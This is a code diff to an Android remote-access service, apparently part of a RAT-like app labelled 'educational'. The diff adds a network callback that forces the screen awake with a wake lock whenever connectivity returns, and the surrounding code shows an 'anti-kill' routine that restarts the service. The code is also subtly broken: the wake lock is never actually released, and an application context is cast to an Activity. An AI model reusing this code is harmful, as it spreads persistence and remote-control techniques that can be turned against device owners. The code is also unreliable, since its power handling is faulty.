@@ -5,9 +5,17 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.PendingIntent;
 import android.app.Service;
+import android.content.BroadcastReceiver;
+import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
+import android.net.ConnectivityManager;
+import android.net.Network;
+import android.net.NetworkCapabilities;
 import android.os.Build;
 import android.os.IBinder;
+import android.os.PowerManager;
+import android.view.WindowManager;
 import androidx.core.app.NotificationCompat;
 import com.remoteaccess.educational.MainActivity;
 import com.remoteaccess.educational.network.SocketManager;
@@ -21,12 +29,90 @@ public class RemoteAccessService extends Service {
 
     private SocketManager socketManager;
     private PreferenceManager preferenceManager;
+    private ConnectivityManager connectivityManager;
+    private PowerManager powerManager;
+    private NetworkCallback networkCallback;
+    private boolean isScreenOn = false;
 
     @Override
     public void onCreate() {
         super.onCreate();
         preferenceManager = new PreferenceManager(this);
+        connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
+        powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
         createNotificationChannel();
+        registerNetworkCallback();
+    }
+
+    private void registerNetworkCallback() {
+        if (connectivityManager != null) {
+            networkCallback = new NetworkCallback();
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                connectivityManager.registerDefaultNetworkCallback(networkCallback);
+            }
+        }
+    }
+
+    private class NetworkCallback extends ConnectivityManager.NetworkCallback {
+        @Override
+        public void onAvailable(Network network) {
+            super.onAvailable(network);
+            // Network is available - wake up screen
+            wakeUpScreen();
+        }
+
+        @Override
+        public void onLost(Network network) {
+            super.onLost(network);
+            // Network lost - release wake lock
+            releaseWakeLock();
+        }
+
+        @Override
+        public void onCapabilitiesChanged(Network network, NetworkCapabilities networkCapabilities) {
+            super.onCapabilitiesChanged(network, networkCapabilities);
+            boolean hasInternet = networkCapabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET);
+            if (hasInternet) {
+                wakeUpScreen();
+            } else {
+                releaseWakeLock();
+            }
+        }
+    }
+
+    private void wakeUpScreen() {
+        if (powerManager == null) return;
+
+        try {
+            PowerManager.WakeLock wakeLock = powerManager.newWakeLock(
+                PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP,
+                "RemoteAccess::ScreenWakeLock"
+            );
+            wakeLock.acquire(10 * 60 * 1000L); // 10 minutes max
+
+            // Also try to turn on screen via window flags if activity context available
+            try {
+                android.app.Activity activity = (android.app.Activity) getApplicationContext();
+                if (activity != null) {
+                    activity.runOnUiThread(new Runnable() {
+                        @Override
+                        public void run() {
+                            activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
+                        }
+                    });
+                }
+            } catch (Exception e) {
+                // Ignore if not in activity context
+            }
+
+            isScreenOn = true;
+        } catch (Exception e) {
+            // Ignore
+        }
+    }
+
+    private void releaseWakeLock() {
+        isScreenOn = false;
     }
 
     @Override
@@ -86,6 +172,15 @@ public class RemoteAccessService extends Service {
         super.onDestroy();
         if (socketManager != null) {
             socketManager.disconnect();
+        }
+
+        // Unregister network callback
+        try {
+            if (networkCallback != null && connectivityManager != null) {
+                connectivityManager.unregisterNetworkCallback(networkCallback);
+            }
+        } catch (Exception e) {
+            // Ignore
         }
         
         // Anti-Kill: Restart service if killed
